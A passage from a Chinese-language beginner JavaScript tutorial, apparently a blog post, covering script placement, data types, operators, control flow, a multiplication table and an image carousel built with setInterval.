title="&lt;script&gt;标签"></a><code>&lt;script&gt;</code>标签</h3><p>如需在 HTML 页面中插入 JavaScript，请使用<code>&lt;script&gt;</code>标签。<br><code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 会告诉 JavaScript 在何处开始和结束。<br><code>&lt;script&gt;</code> 和 <code>&lt;/script&gt; </code>之间的代码行包含了 JavaScript:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">alert(&quot;我的第一个 JavaScript&quot;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="JS的写入位置"><a href="#JS的写入位置" class="headerlink" title="JS的写入位置"></a>JS的写入位置</h3><ul><li>行内式</li><li>内嵌式</li><li>外链式</li></ul><h4 id="行内式"><a href="#行内式" class="headerlink" title="行内式"></a>行内式</h4><p>直接书写在标签身上，是一个简写的事件，所以又称之为事件属性。     onclick单击事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;按钮1!&quot; onclick&#x3D;&quot;alert(&#39;提示内容！&#39;);&quot;&gt;</span><br><span class="line">&lt;button onclick&#x3D;&quot;alert(&#39;提示内容&#39;);&quot;&gt;按钮2&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure><h4 id="内嵌式"><a href="#内嵌式" class="headerlink" title="内嵌式"></a>内嵌式</h4><p>理论上js可以书写在页面的任意位置，为了不影响内容，可以统一写<head>中或者写在<body>最后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">alert(&quot;内嵌式&quot;)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="外链式"><a href="#外链式" class="headerlink" title="外链式"></a>外链式</h4><p>首先新建一个文件类型为.js的文件，然后在该文件中写js语句，通过script标签对引入到html页面中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;js文件路径地址&quot;&gt;这里不能写js语句&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="JavaScript-函数和事件"><a href="#JavaScript-函数和事件" class="headerlink" title="JavaScript 函数和事件"></a>JavaScript 函数和事件</h3><p>上面例子中的 JavaScript 语句，会在页面加载时执行。</p><p>通常，我们需要在某个事件发生时执行代码，比如当用户点击按钮时。</p><p>如果我们把 JavaScript 代码放入函数中，就可以在事件发生时调用该函数。</p><p>您将在稍后的章节学到更多有关 JavaScript 函数和事件的知识。</p><h3 id="在-lt-head-gt-或-lt-body-gt-的JavaScript"><a href="#在-lt-head-gt-或-lt-body-gt-的JavaScript" class="headerlink" title="在&lt;head&gt;或&lt;body&gt;的JavaScript"></a>在<code>&lt;head</code>&gt;或<code>&lt;body&gt;</code>的JavaScript</h3><p>您可以在 HTML 文档中放入不限数量的脚本。</p><p>脚本可位于 HTML 的 <code>&lt;body&gt;</code> 或 <code>&lt;head&gt;</code> 部分中，或者同时存在于两个部分中。</p><p>通常的做法是把函数放入 <code>&lt;head&gt;</code> 部分中，或者放在页面底部。这样就可以把它们安置到同一处位置，不会干扰页面的内容。</p><h2 id="对JavaScript语言的基本了解"><a href="#对JavaScript语言的基本了解" class="headerlink" title="对JavaScript语言的基本了解"></a>对JavaScript语言的基本了解</h2><p>JS也是一门语言，每一条语句要加上”;”表示结束。与Java语言类似</p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>JS中的数据类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">数值型：number（凡是数字都是数值型，不区分整数和小数）</span><br><span class="line">字符串：string（凡是引号包裹起来的内容全部都是字符串）</span><br><span class="line">布尔：boolean（true、false）</span><br><span class="line">对象类型：object（特殊取值null）</span><br><span class="line">未定义型：undefined</span><br></pre></td></tr></table></figure><p>对比Java中的数据类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">整数：byte short int long</span><br><span class="line">小数：float double</span><br><span class="line">字符：char </span><br><span class="line">布尔：boolean</span><br><span class="line">字符串：String</span><br></pre></td></tr></table></figure><h3 id="变量（variable）"><a href="#变量（variable）" class="headerlink" title="变量（variable）"></a>变量（variable）</h3><p>定义：存储数据</p><p>声明变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var 变量名称 &#x3D; 存储的数据;</span><br></pre></td></tr></table></figure><p>变量命名规范：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 只能由字母、数字、_（下划线）、$（美元符号）组成。</span><br><span class="line">2. 不能以数字开头。</span><br><span class="line">3. 命名中不能出现-（js会理解成减号进行减法的操作），不能和关键字冲突。</span><br></pre></td></tr></table></figure><p><strong>js是弱类型语言，不重视类型的定义，但js会根据为变量赋值的情况自定判断该变量是何种类型：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数值型：var i &#x3D; 1;var d &#x3D; 2.35;</span><br><span class="line">字符串：var str &#x3D; &quot;用心学习&quot;;</span><br><span class="line">布尔型：var b &#x3D; true;</span><br></pre></td></tr></table></figure><p>对比Java:java是强类型的语言，注重类型的定义，Java定义类型如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">整型：int i &#x3D; 1;</span><br><span class="line">浮点型：double d &#x3D; 2.35;</span><br><span class="line">字符串：String str &#x3D; “用心学习”;</span><br><span class="line">布尔型：boolean b &#x3D; true;</span><br></pre></td></tr></table></figure><p><strong>总结：js中变量的定义。只要加一个var就行。java则使用什么类型的变量就要定义什么类型的。</strong></p><h3 id="检测数据类型："><a href="#检测数据类型：" class="headerlink" title="检测数据类型："></a>检测数据类型：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">typeof(value); 或者typeof value;     返回这个变量的类型. </span><br><span class="line">说明 : 同一个变量, 可以进行不同类型的数据赋值.</span><br></pre></td></tr></table></figure><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><p><code>+    -    *    /    %    ++    --</code><br>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 由于js中的小数和整数都是number类型，不存在类似整数除以整数还是整数的结论。</span><br><span class="line">2. 字符串和其他的数据使用+号运算，会连接成一个新的字符串。</span><br><span class="line">3. 字符串使用除了+以外的运算符：如果字符串本身是一个数字，那么会自动转成number进行运算</span><br><span class="line">，否则就会返回一个NaN的结果，表示这不是一个数字。NaN：not a number</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">    alert(1234 &#x2F; 1000 * 1000); &#x2F;&#x2F; 1234</span><br><span class="line">  </span><br><span class="line">    var s &#x3D; &quot;12&quot;;</span><br><span class="line">     s -&#x3D; 10;</span><br><span class="line">    alert(s);  &#x2F;&#x2F; 2</span><br><span class="line"> </span><br><span class="line">    var s &#x3D; &quot;aa&quot;;</span><br><span class="line">    s -&#x3D; 10;</span><br><span class="line">    alert(s);  &#x2F;&#x2F; NaN       Not a Number 不是一个数字</span><br><span class="line"> </span><br><span class="line">    var s &#x3D; &quot;12&quot;;</span><br><span class="line">    s +&#x3D; 10;</span><br><span class="line">    alert(s);       &#x2F;&#x2F; 1210 </span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&#x3D;&lt;&lt;&#x3D;  !&#x3D;</span><br><span class="line">&#x3D;&#x3D;等于（只比较内容）&#x3D;&#x3D;&#x3D;恒等于（比较内容的同时还要比较数据类型）</span><br><span class="line">注意：关系运算符返回的结果只有两个：true &#x2F; false</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 请问1 : 3 &gt; 5, 结果为 ?</span><br><span class="line">    alert(3 &gt; 5);   &#x2F;&#x2F; false</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 请问2 : “22” &#x3D;&#x3D; 22  结果为 ?</span><br><span class="line">    alert(&quot;22&quot; &#x3D;&#x3D; 22); &#x2F;&#x2F; true  (仅仅判断数值)</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 请问3 : “22” &#x3D;&#x3D;&#x3D; 22  结果为 ?</span><br><span class="line">    alert(&quot;22&quot; &#x3D;&#x3D;&#x3D; 22);  &#x2F;&#x2F; false  (恒等于, 数值和类型都要相等)</span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp; 与true&amp;&amp;false&#x3D;&#x3D;&#x3D;&#x3D;&gt;false</span><br><span class="line">|| 或true||false&#x3D;&#x3D;&#x3D;&#x3D;&gt;true</span><br><span class="line">！ 非!true&#x3D;&#x3D;&#x3D;&#x3D;&gt;false</span><br><span class="line">false（理解）：false,  0,  null,  undefined </span><br><span class="line">true（理解）：true, 非0,  非null,  非undefined</span><br><span class="line"> </span><br><span class="line"> &amp;&amp; : 找第一个出现的假值. (一假即假)</span><br><span class="line"> || : 找第一个出现的真值. (一真即真)</span><br></pre></td></tr></table></figure><p>与演示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 短路与 (一假即假)</span><br><span class="line">    &#x2F;&#x2F; 口诀 : 找第一个为假的值.</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 请问1 :  8 &lt; 7 &amp;&amp; 3 &lt; 4, 结果为 ?</span><br><span class="line">    alert(8 &lt; 7 &amp;&amp; 3 &lt; 4);  &#x2F;&#x2F; false</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 请问2 :  -2 &amp;&amp; 6 + 6 &amp;&amp; null 结果为 ?</span><br><span class="line">    alert(-2 &amp;&amp; 6 + 6 &amp;&amp; null); &#x2F;&#x2F; null</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 请问3 :  1 + 1 &amp;&amp; 0 &amp;&amp; 5  结果为 ?</span><br><span class="line">    alert(1 + 1 &amp;&amp; 0 &amp;&amp; 5); &#x2F;&#x2F; 0</span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>或演示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 短路或 : 一真即真.</span><br><span class="line">    &#x2F;&#x2F; 口诀 : 找第一个为真的值.</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 请问1 :  0 || 23 结果为 ?</span><br><span class="line">    alert(0 || 23); &#x2F;&#x2F; 23</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 请问2 :  0 || false || true  结果为 ?</span><br><span class="line">    alert(0 || false || true); &#x2F;&#x2F; true</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 请问3 :  null || 10 &lt; 8 || 10 + 10结果为 ?</span><br><span class="line">    alert(null || 10 &lt; 8 || 10 + 10);  &#x2F;&#x2F; 20</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 请问4 :  null || 10 &lt; 8 || false结果为 ?</span><br><span class="line">    alert(null || 10 &lt; 8 || false); &#x2F;&#x2F; false</span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h4><p>条件？表达式1：表达式2<br>如果条件为true，返回表达式1的结果<br>如果条件为false，返回表达式2的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 请问1 :  3 ? “aaa” : “bbb” 结果为 ?</span><br><span class="line">    alert(3 ? &quot;aaa&quot; : &quot;bbb&quot;);       &#x2F;&#x2F; aaa</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 请问2 :  0 ? “ccc” : “ddd”  结果为 ?</span><br><span class="line">    alert(0 ? &quot;ccc&quot; : &quot;ddd&quot;);       &#x2F;&#x2F; ddd</span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><p>很多与Java中的流程控制语句一样</p><h4 id="if条件语句"><a href="#if条件语句" class="headerlink" title="if条件语句"></a>if条件语句</h4><p>与Java中if语句一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">      var score &#x3D; 59;</span><br><span class="line"> </span><br><span class="line">      if (score &gt;&#x3D; 90) &#123;</span><br><span class="line">          alert(&quot;优秀&quot;);</span><br><span class="line">      &#125; else if (score &gt;&#x3D; 80) &#123;</span><br><span class="line">          alert(&quot;良好&quot;);</span><br><span class="line">      &#125; else if (score &gt;&#x3D; 60) &#123;</span><br><span class="line">          alert(&quot;及格&quot;);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">          alert(&quot;不及格&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">  &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="switch分支结构"><a href="#switch分支结构" class="headerlink" title="switch分支结构"></a>switch分支结构</h4><p>这个和java中switch结构一样。只是Java中表达式为：常量 整型（去long）、字符、字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">      var score &#x3D; 59;</span><br><span class="line"> </span><br><span class="line">      &#x2F;&#x2F; 需求 : 将需要一个整型数值, 不想要小数点.</span><br><span class="line">      &#x2F;&#x2F; window 对象的 parseInt 方法.</span><br><span class="line">      score &#x3D; window.parseInt(score &#x2F; 10 + &quot;&quot;);</span><br><span class="line">      &#x2F;&#x2F; alert(score);</span><br><span class="line"> </span><br><span class="line">      switch (score) &#123;</span><br><span class="line">          case 10:</span><br><span class="line">          case 9:</span><br><span class="line">              alert(&quot;优秀!&quot;);</span><br><span class="line">              break;</span><br><span class="line">          case 8:</span><br><span class="line">              alert(&quot;良好!&quot;);</span><br><span class="line">              break;</span><br><span class="line">          case 7:</span><br><span class="line">          case 6:</span><br><span class="line">              alert(&quot;及格!&quot;);</span><br><span class="line">              break;</span><br><span class="line">          default:</span><br><span class="line">              alert(&quot;不及格!&quot;);</span><br><span class="line">              break;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">  &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="循环结构while、do-while、for语句"><a href="#循环结构while、do-while、for语句" class="headerlink" title="循环结构while、do-while、for语句"></a>循环结构while、do-while、for语句</h4><ul><li>while(循环条件){循环体;}</li><li>do{循环体;}while(循环条件);</li><li>for(循环变量赋初值；循环条件；循环变量增值){循环语句;}</li><li>console.log（…）; 以日志的形式在控制台输出结果！</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 需求 : 统计 1~100 之间能够被3和7整除的数字个数</span><br><span class="line"> </span><br><span class="line">    var count &#x3D; 0;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 1. 遍历 1~100 之间的所有整型数值</span><br><span class="line">    for (var i &#x3D; 1; i &lt;&#x3D; 100; i++) &#123;</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F; 2. 判断</span><br><span class="line">        if (i % 3 &#x3D;&#x3D; 0 &amp;&amp; i % 7 &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            &#x2F;&#x2F; alert(i);</span><br><span class="line">            console.log(i);</span><br><span class="line">            &#x2F;&#x2F; 3. 累加个数</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 4. 查看结果</span><br><span class="line">    &#x2F;&#x2F; alert(count);</span><br><span class="line">    console.log(count);</span><br></pre></td></tr></table></figure><h4 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h4><p>演示案例9*9乘法表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">       table &#123;</span><br><span class="line">           &#x2F;* 将 table 表格的线变成了细线 *&#x2F;</span><br><span class="line">           border-collapse: collapse;</span><br><span class="line">           &#x2F;*color: red;*&#x2F;</span><br><span class="line">           border-color: red;</span><br><span class="line">       &#125;</span><br><span class="line">   &lt;&#x2F;style&gt;</span><br><span class="line"></span><br><span class="line">   &lt;script&gt;</span><br><span class="line"></span><br><span class="line">       &#x2F;&#x2F; 需求 : 九九乘法口诀表</span><br><span class="line">       document.write(&quot;&lt;table border&#x3D;&#39;1px solid red&#39; cellspacing&#x3D;&#39;0&#39; cellpadding&#x3D;&#39;8px&#39;&gt;&quot;);</span><br><span class="line">       document.write(&quot;&lt;caption&gt;九九乘法口诀表&lt;&#x2F;caption&gt;&quot;);</span><br><span class="line">       for (var i &#x3D; 1; i &lt;&#x3D; 9; i++) &#123;</span><br><span class="line">           document.write(&quot;&lt;tr&gt;&quot;);</span><br><span class="line">           for (var j &#x3D; 1; j &lt;&#x3D; i; j++) &#123;</span><br><span class="line">               document.write(&quot;&lt;td&gt;&quot;);</span><br><span class="line">               document.write(j + &quot;*&quot; + i + &quot;&#x3D;&quot; + (j*i) + &quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;);</span><br><span class="line">               document.write(&quot;&lt;&#x2F;td&gt;&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">           document.write(&quot;&lt;&#x2F;tr&gt;&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">       document.write(&quot;&lt;&#x2F;table&gt;&quot;);</span><br><span class="line"></span><br><span class="line">   &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="案例-轮播图"><a href="#案例-轮播图" class="headerlink" title="案例-轮播图"></a>案例-轮播图</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">说明1 : script 标签需要放在 body 标签之后.</span><br><span class="line"> </span><br><span class="line">说明2 : window.setInterval(“字符串函数名称()”, 时间毫秒数);</span><br><span class="line"> </span><br><span class="line">说明3 : window.setInterval(函数名称, 时间毫秒数);</span><br><span class="line"> </span><br><span class="line">说明4 : window.setInterval(匿名函数, 时间毫秒数);            推荐使用</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;轮播图&lt;&#x2F;title&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;style&gt;</span><br><span class="line"> </span><br><span class="line">        div &#123;</span><br><span class="line">            width: 80%;</span><br><span class="line">            margin: 50px auto;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        img &#123;</span><br><span class="line">            width: 100%;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;img src&#x3D;&quot;..&#x2F;img&#x2F;01.jpg&quot; alt&#x3D;&quot;图片&quot;&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><p>实现一：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 需求 : 动态获取页面中的 img 标签, 然后修改 img 标签的 src 属性.</span><br><span class="line">    &#x2F;&#x2F; 1. 获取 img 标签</span><br><span class="line">    var img &#x3D; document.getElementById(&quot;img&quot;);</span><br><span class="line">    &#x2F;&#x2F; alert(img);</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 定义一个变量</span><br><span class="line">    var count &#x3D; 1;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 1.2 定义一个函数</span><br><span class="line">    function changeImageSrc() &#123;</span><br><span class="line">        count++;</span><br><span class="line">        img.src &#x3D; &quot;..&#x2F;img&#x2F;0&quot;+count+&quot;.jpg&quot;;</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F; 判断</span><br><span class="line">        if (count &#x3D;&#x3D; 8) &#123;</span><br><span class="line">            count &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 2. 循环切换图片</span><br><span class="line">    &#x2F;&#x2F; window.setInterval(函数, 时间毫秒); 在指定的时间毫秒间隔, 不断调用第一个参数传入的函数.</span><br><span class="line">    &#x2F;&#x2F; 调用方式一 :</span><br><span class="line">    &#x2F;&#x2F; window.setInterval(&quot;changeImageSrc()&quot;, 1000);</span><br><span class="line">    &#x2F;&#x2F; 调用方式二 :</span><br><span class="line">    window.setInterval(changeImageSrc, 1000);</span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>实现二：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 需求 : 动态获取页面中的 img 标签, 然后修改 img 标签的 src 属性.</span><br><span class="line">    &#x2F;&#x2F; 1. 获取 img 标签</span><br><span class="line">    var img &#x3D; document.getElementById(&quot;img&quot;);</span><br><span class="line">    &#x2F;&#x2F; alert(img);</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 定义一个变量</span><br><span class="line">    var count &#x3D; 1;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; 2. 循环切换图片</span><br><span class="line">    &#x2F;&#x2F; 